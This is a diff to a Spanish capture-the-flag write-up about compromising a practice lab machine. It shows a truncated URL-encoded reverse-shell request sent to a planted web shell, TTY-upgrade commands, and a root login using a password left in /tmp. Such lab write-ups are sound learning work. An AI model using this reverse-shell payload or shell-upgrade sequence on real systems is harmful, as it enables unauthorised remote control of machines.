@@ -49,3 +49,23 @@ http://172.17.0.2/shell.php?parameter=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev
 
 <img width="636" height="176" alt="Screenshot_5" src="https://github.com/user-attachments/assets/48a780b3-7149-4e0c-a9d1-f5ea598a4318" />
 
+Ya una vez dentro del sistema, me voy a la carpeta `/tmp` recordando el mensajito que nos dejó Mario:
+
+<img width="485" height="162" alt="Screenshot_1" src="https://github.com/user-attachments/assets/1cd5e353-40d4-4c29-97ef-11161e30f73d" />
+
+Mario nos da la password de `root`, pero antes de iniciar sesión como `root` decido hacer un **Tratamiento de la tty**. Es la primera vez que lo realizo y es algo que siempre me recomiendan que me acostumbre a utilizar:
+
+```bash
+> script /dev/null -c bash
+> ^Z
+> stty raw -echo; fg
+> reset
+> xterm
+```
+
+Y ahora si, accedo como `root`:
+
+<img width="311" height="84" alt="Screenshot_2" src="https://github.com/user-attachments/assets/7f223e12-4ba2-439a-bf49-81584a182155" />
+
+## Comentarios
+Con esta máquina he descubierto la forma de ejecutar una **Reverse Shell** mediante la vulnerabilidad **FLI**, sabía que era posible y he encontrado la forma de codificarla para que funcione desde la **URL**.
